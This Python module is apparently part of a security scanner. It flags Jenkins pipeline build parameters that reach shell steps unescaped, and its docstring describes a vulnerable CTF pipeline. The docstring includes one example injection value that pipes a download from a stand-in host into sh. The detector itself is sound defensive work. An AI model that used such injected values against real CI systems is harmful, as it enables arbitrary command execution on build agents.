r"""
jenkins_pipeline_guard.py — best-effort "Jenkins declarative pipeline
parameter flows into a shell step" detector for .groovy/Jenkinsfile
sources.

Found via a real CyberSci corpus audit: nationals-2025-26's defence
challenge "deployment_hell" ships a real Jenkins declarative pipeline
(service/jenkins/scripts/deploy-app.groovy) whose `parameters { string(name:
'projectName', ...) }` build parameter is copied into an environment
variable (`env.PROJECT_NAME = params.projectName`) and from there straight
into a `sh '''...${PROJECT_NAME}...'''` step — Jenkins substitutes
`${PROJECT_NAME}` as literal shell text before invoking `/bin/sh -c`, so
any Jenkins user able to trigger a parameterized build (often anyone with
basic "Build" permission, sometimes anonymous) can set projectName to
something like `canary; curl evil/x|sh` and get arbitrary command
execution on the Jenkins agent. This had zero coverage: flagmap has no
Groovy/Jenkinsfile language at all (not one of the 8 tree-sitter-backed
AST languages, and no regex rules tagged for it either).

Scoped deliberately narrow rather than adding a full 9th AST language for
one evidenced shape: no tree-sitter-groovy grammar exists in this
codebase, and a declarative Jenkinsfile's `sh` step uses Groovy's
parenthesis-free "command syntax" (`sh '''...'''`, not `sh('''...''')`),
which the existing taint-lite regex engine's generic `sinkname\s*\(` sink
matcher in taint.py can't reach anyway. Instead, same two-independent-
signals discipline as csrf.py/idor.py/jquery_dom_guard.py, done as plain
whole-file regex extraction (no AST needed for either signal):

  1. Every pipeline parameter name declared via `string(name: 'X', ...)`,
     plus every env-var alias created via `env.Y = params.X` (or
     `env.Y = "${params.X}"`) — both signals read directly off the
     source text, no cross-file/variable-scope resolution attempted.
  2. Every `sh` step's own body text (parenthesis-free command syntax or
     the parenthesized/`script:`-keyed form, single/double/triple-quoted,
     spanning multiple physical lines for the triple-quoted case) is
     checked for a `${NAME}`/`$NAME`/`params.NAME` reference to any name
     from signal 1.

Fires only when both signals land in the same file: a `sh` step with no
parameter-derived variable anywhere in its body, or a declared parameter
never actually used inside any `sh` step, are each left alone.

Known blind spots, same honesty standard as every other best-effort guard
in this project:
- Only recognizes the `string(name: ...)` parameter shape and the direct
  `env.Y = params.X` aliasing idiom — a `choice`/`booleanParam` parameter,
  or a parameter threaded through a method call or a Groovy variable
  (`def x = params.X; env.Y = x`) rather than a direct assignment, is not
  tracked. Narrower than real cross-statement taint tracking, same trade
  idor.py's bare-parameter fallback already accepts.
- Doesn't attempt to judge whether the `sh` step's shell is actually
  reachable by a sufficiently-privileged-but-still-attacker-controlled
  party (Jenkins' own permission model varies by install) — same
  "the sink shape is the finding, not a privilege-escalation proof" trade
  patterns.py's whole rule set already makes everywhere else.
- A single-quoted `sh '...'` step genuinely can't be injected via Groovy
  GString `${}` interpolation (single quotes don't interpolate in
  Groovy) — but Jenkins' own declarative `sh` step treats its entire
  string argument as a shell script regardless of the Groovy quoting
  used to write it, and substitutes `${VAR}`-shaped text as a *shell*
  variable expansion once the script reaches `/bin/sh`, not as Groovy
  string interpolation — which is exactly why the real deploy-app.groovy
  file above uses `sh '''...${PROJECT_NAME}...'''` (Groovy triple-single-
  quoted, not interpolated at the Groovy level at all) and is still
  injectable. This check does not try to distinguish the two cases and
  treats every quote style the same, which is the correct call here, not
  a gap.
"""

import re
from typing import List

GROOVY_LANGUAGES = {"groovy"}

_PARAM_NAME_RE = re.compile(r"""\bstring\s*\(\s*name\s*:\s*['"](\w+)['"]""")
_ENV_ALIAS_RE = re.compile(r"""\benv\.(\w+)\s*=\s*["']?\$?\{?\s*params\.(\w+)""")
# Anchored to the START of a (whitespace-trimmed) line rather than a bare
# \bsh\b word-boundary match: a plain word-boundary anchor also matches the
# literal substring "sh" wherever it happens to appear as its own token —
# including inside an unrelated string literal, e.g. a stage description
# that happens to end in "...multi-line sh" immediately before its own
# closing quote, which looks to a bare \bsh\b matcher exactly like the
# start of a real `sh` step. A real Jenkinsfile `sh` step is always written
# as its own statement starting a line, so requiring that is both safer and
# still matches every real shape this file's docstring describes.
_SH_STEP_RE = re.compile(
    r"""^[ \t]*sh\s*\(?\s*(?:script\s*:\s*)?(?P<q>'''|\"\"\"|'|\")(?P<body>.*?)(?P=q)""",
    re.DOTALL | re.MULTILINE,
)
# The first alternative's `(?:params\.)?` is deliberate, not redundant with
# the second alternative: `\w+` stops at the first non-word character, so
# without it `${params.projectName}` would match as "$" + "{" + "params"
# (the property-access dot isn't a word char) and never reach
# "projectName" at all — the capturing group would just be the literal
# word "params", which isn't any real parameter's name and would silently
# never match the tainted-name set. The second alternative then covers the
# other real shape: a bare `params.X` property access with no leading "$"
# at all, e.g. built via Groovy string concatenation ("docker build -t " +
# params.projectName) rather than GString interpolation.
_VAR_REF_RE = re.compile(r"""\$\{?(?:params\.)?(\w+)\}?|\bparams\.(\w+)""")


class _PipelineFinding:
    __slots__ = ("file", "line_no", "line_text")

    def __init__(self, file: str, line_no: int, line_text: str):
        self.file = file
        self.line_no = line_no
        self.line_text = line_text


def find_jenkins_param_injection(path: str, language: str, lines: List[str]) -> List[_PipelineFinding]:
    """Best-effort: a Jenkins declarative pipeline `string` build parameter
    (directly, or via a direct `env.X = params.Y` alias) referenced inside a
    `sh` step's own body. See this module's docstring for exactly what it
    does and doesn't try to prove. No-op outside .groovy/Jenkinsfile
    sources."""
    if language not in GROOVY_LANGUAGES:
        return []

    full_text = "".join(lines)

    param_names = set(_PARAM_NAME_RE.findall(full_text))
    if not param_names:
        return []

    tainted_names = set(param_names)
    for env_name, src_param in _ENV_ALIAS_RE.findall(full_text):
        if src_param in param_names:
            tainted_names.add(env_name)

    findings: List[_PipelineFinding] = []
    seen_lines = set()
    for m in _SH_STEP_RE.finditer(full_text):
        body = m.group("body")
        refs = {g1 or g2 for g1, g2 in _VAR_REF_RE.findall(body)}
        if not refs & tainted_names:
            continue
        line_no = full_text.count("\n", 0, m.start()) + 1
        if line_no in seen_lines:
            continue
        seen_lines.add(line_no)
        line_idx = line_no - 1
        line_text = lines[line_idx].strip()[:200] if line_idx < len(lines) else ""
        findings.append(_PipelineFinding(file=path, line_no=line_no, line_text=line_text))

    return findings
